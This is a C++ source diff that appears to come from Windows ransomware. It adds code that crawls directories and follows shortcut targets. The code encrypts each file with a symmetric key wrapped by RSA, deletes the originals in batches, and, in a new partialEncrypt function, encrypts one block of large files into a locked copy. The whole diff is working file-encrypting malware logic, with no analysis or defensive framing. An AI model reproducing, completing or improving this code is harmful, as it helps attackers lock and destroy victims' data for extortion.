@@ -236,6 +236,7 @@ bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
 	if (!plaintextFile.is_open()) {
 		return false;
 	}
+	std::filebuf* mybuf = plaintextFile.rdbuf();
 	*buffer = new BYTE[buffSize + 1];
 	if(nullptr == *buffer) {
 		plaintextFile.close();
@@ -325,7 +326,7 @@ Status encrypt(string path, RsaEncryptor& encryptor)
 		goto CLEANUP;
 	}
 	DWORD cipherSize,resSize;
-	//CHECK IF NEEDED V
+	
 	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if(NULL == tmpIv) {
 		status = STATUS_UNSUCCESSFUL;
@@ -518,52 +519,216 @@ static void iterate(const path& parent,
 	directory_iterator end_itr;
 	static long long sumSize;
 	Status status = STATUS_SUCCESS;
+	try {
+		for (directory_iterator itr(parent); itr != end_itr; ++itr) {
+			path = itr->path().string();
+			std::cout << "handling " << path << std::endl;//DEBUG PRINT
+			string ending(path.begin() + path.size() - 3, path.end());
+			bool lnkFile = false;
 
-	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
-		path = itr->path().string();
-		std::cout << "handling " << path << std::endl;//DEBUG PRINT
-		string ending(path.begin()+path.size()-3, path.end());
-		bool lnkFile =false;
-
-		if (ending == "lnk") lnkFile = true; 
-		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
-			if (is_valid_folder(path))
-			{
-				iterate(path, rsaEncryptor, processedPaths);
-			}
-		}
-		else if(lnkFile){
-			size_t linkPathSize = MAX_PATH;
-			//char* linkPath = (char*)HeapAlloc(GetProcessHeap(), 0, linkPathSize);
-			char* bufStr = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
-			if (bufStr == nullptr) continue;
-			if (getLinkTarget(path.c_str(), bufStr, path.size()) == 0) continue;
-			path = string(bufStr);
-			HeapFree(GetProcessHeap(), 0, bufStr);
-			if(is_directory(path))
-				iterate(path, rsaEncryptor, processedPaths);
-		}
-		else {
-			if (!do_encrypt(path)) continue;//see TODO 2 rows below
-			status = encrypt(path, rsaEncryptor);
-			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
-			if(!NT_SUCCESS(status))
-			{
-				continue;
-			}
-			processedPaths.push_back(path);
-			sumSize += file_size(path);
-			if (processedPaths.size() > COUNT_THRESHOLD || sumSize >= SIZE_THRESHOLD)
-			{
-				boost::system::error_code ec;
-				for (auto& fileToDelete : processedPaths)
+			if (ending == "lnk") lnkFile = true;
+			if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
+				if (is_valid_folder(path))
 				{
-					remove(fileToDelete, ec);
+					iterate(path, rsaEncryptor, processedPaths);
 				}
-				//TODO handle unsuccessful remove
-				sumSize = 0;
-				processedPaths.clear();
+			}
+			else if (lnkFile) {
+				size_t linkPathSize = MAX_PATH;
+				//char* linkPath = (char*)HeapAlloc(GetProcessHeap(), 0, linkPathSize);
+				char* bufStr = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_PATH);
+				if (bufStr == nullptr) continue;
+				if (getLinkTarget(path.c_str(), bufStr, path.size()) == 0) continue;
+				path = string(bufStr);
+				HeapFree(GetProcessHeap(), 0, bufStr);
+				if (is_directory(path))
+					iterate(path, rsaEncryptor, processedPaths);
+			}
+			else {
+				if (!do_encrypt(path)) continue;
+				status = encrypt(path, rsaEncryptor);
+
+				if (!NT_SUCCESS(status))
+				{
+					continue;
+				}
+				processedPaths.push_back(path);
+				sumSize += file_size(path);
+				boost::system::error_code ec;
+				//CHECK NEW FEATURE
+				ULARGE_INTEGER freeSpace;
+				if (!GetDiskFreeSpaceEx(parent.string().c_str(), &freeSpace, NULL, NULL))
+					std::cout << "getFreeSpaceFailed " << GetLastError() << std::endl;
+				else
+					std::cout << "free space before clear is " << freeSpace.QuadPart << std::endl;
+				//
+				if (processedPaths.size() > COUNT_THRESHOLD || sumSize >= SIZE_THRESHOLD)
+				{
+
+					for (auto& fileToDelete : processedPaths)
+					{
+						remove(fileToDelete, ec);
+					}
+					sumSize = 0;
+					processedPaths.clear();
+				}
+				//
+				if (!GetDiskFreeSpaceEx(parent.string().c_str(), &freeSpace, NULL, NULL))
+					std::cout << "getFreeSpaceFailed " << GetLastError() << std::endl;
+				else
+					std::cout << "free space after clear is " << freeSpace.QuadPart << std::endl;
+				//
 			}
 		}
+	} catch(...)
+	{
 	}
+}
+
+void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
+{
+	PBYTE plaintext = nullptr;
+	PBYTE key = nullptr;
+	PBYTE iv = nullptr;
+	PBYTE tmpIv = nullptr;
+	PBYTE encBuffer = nullptr;
+	PBYTE keyIv = nullptr;
+	PBYTE keyIvBuffer = nullptr;
+	char* restBuffer = nullptr;
+	BCRYPT_KEY_HANDLE	keyHandle = 0;
+	BCRYPT_ALG_HANDLE algHandle = 0;
+
+	std::ofstream outFile;
+	std::ifstream inFile;
+	//check free space in machine 
+	ULARGE_INTEGER freeSpace;
+	long sz = BIG_FILE_BLOCK_SIZE;
+	DWORD cipherSize = 0;
+	DWORD resSize = 0;
+	boost::filesystem::path path_path = path;
+	if (!GetDiskFreeSpaceEx(path_path.parent_path().string().c_str(), &freeSpace, NULL, NULL)) {
+		goto PART_ENC_CLEANUP;
+	}
+	size_t fileSize = getFileSize(path);
+	if(fileSize +146 < fileSize)
+	{
+		//overflow
+		goto PART_ENC_CLEANUP;
+	}
+	if (fileSize + 146 < freeSpace.QuadPart)
+	{
+		if(!initPlainText(path, &plaintext, 2*sz))//100*2^20 = 100MB
+		{
+			std::cout << "failed on initPlaintext";
+			goto PART_ENC_CLEANUP;
+		}
+		if(!myCopyFiles(path,0,sz,path+PART_LOCKED_EXT,0))
+		{
+			goto PART_ENC_CLEANUP;
+		}
+
+		if(!NT_SUCCESS(generateKeyAndIV(&iv,&key)))
+		{
+			goto PART_ENC_CLEANUP;
+		}
+		if(!NT_SUCCESS(getKeyHandle(key,keyHandle,algHandle)))
+		{
+			goto PART_ENC_CLEANUP;
+		}
+		tmpIv=(PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+		if (NULL == tmpIv) {
+			goto PART_ENC_CLEANUP;
+		}
+		if(!NT_SUCCESS(BCryptEncrypt(keyHandle, plaintext+sz, sz, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING)))
+		{
+			std::cout << "big file encrypt (first pass) failed" << std::endl;
+			goto PART_ENC_CLEANUP;
+		}
+		encBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
+		if (NULL == encBuffer) {
+			goto PART_ENC_CLEANUP;
+		}
+		
+		if(!NT_SUCCESS(BCryptEncrypt(keyHandle,plaintext+sz,sz, NULL, tmpIv, IV_LEN, encBuffer, cipherSize,&resSize, BCRYPT_BLOCK_PADDING)))
+		{
+			std::cout << "big file encrypt (2nd pass) failed" << std::endl;
+			goto PART_ENC_CLEANUP;
+		}
+
+		keyIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+		if (keyIv == nullptr)
+		{
+			//status = STATUS_UNSUCCESSFUL;
+			goto PART_ENC_CLEANUP;
+		}
+		memcpy(keyIv, key, KEY_LEN);
+		memcpy(keyIv + KEY_LEN, iv, IV_LEN);
+
+		keyIvBuffer = rsaEncryptor.encrypt(keyIv, KEY_LEN + IV_LEN);
+		if (!keyIvBuffer)
+		{
+			//status = STATUS_UNSUCCESSFUL;
+			goto PART_ENC_CLEANUP;
+		}
+		outFile.open(path + PART_LOCKED_EXT, std::ios::binary| std::fstream::app);
+		if (!outFile.is_open())
+		{
+			goto PART_ENC_CLEANUP;
+		}
+		outFile.seekp(0, outFile.end);
+		int padding = 16 - (resSize % 16);
+		outFile << padding;
+
+		outFile.write((char*)keyIvBuffer, ENCRYPTED_KEY_IV_LEN);
+		if (outFile.fail())
+		{
+			goto PART_ENC_CLEANUP;
+		}
+		outFile.write((char*)encBuffer, resSize);
+		if (outFile.fail())
+		{
+			goto PART_ENC_CLEANUP;
+		}
+		size_t currentPlace = outFile.tellp();
+		outFile.close();
+		//	read rest of file and write it (just go over the file in some manner)
+		myCopyFiles(path, 2 * sz, fileSize, path + PART_LOCKED_EXT, currentPlace);
+	}
+	else 
+	{
+		//else
+		//	no room, must be wise. we are to replace 50 Mbytes of data in:
+		//		2 bytes for padding, 128 bytes for keyIV, 50MB+16B bytes for encrypted data
+		//	total shift of 146 bytes.
+		//  go over file from end to beginning and shift data in 146B up to the 100MB line.
+		//  encrypt the 2nd 50 MB  block. 
+		return;
+		//but we don't have time to implement, so skip
+	}
+PART_ENC_CLEANUP:
+	if (inFile.is_open())
+		inFile.close();
+	if (outFile.is_open())
+		outFile.close();
+	if(algHandle)
+		BCryptCloseAlgorithmProvider(algHandle, 0);
+	if (keyHandle)
+		BCryptDestroyKey(keyHandle);
+	if (plaintext)
+		delete[] plaintext;
+	if (key)
+		HeapFree(GetProcessHeap(),0,key);
+	if( iv)
+		HeapFree(GetProcessHeap(), 0, iv);
+	if( tmpIv)
+		HeapFree(GetProcessHeap(), 0, tmpIv);
+	if( encBuffer)
+		HeapFree(GetProcessHeap(), 0, encBuffer);
+	if(keyIv)
+		HeapFree(GetProcessHeap(), 0, keyIv);
+	if( keyIvBuffer )
+		HeapFree(GetProcessHeap(), 0, keyIvBuffer);
+	if (restBuffer)
+		delete[] restBuffer;
+	return;
 }
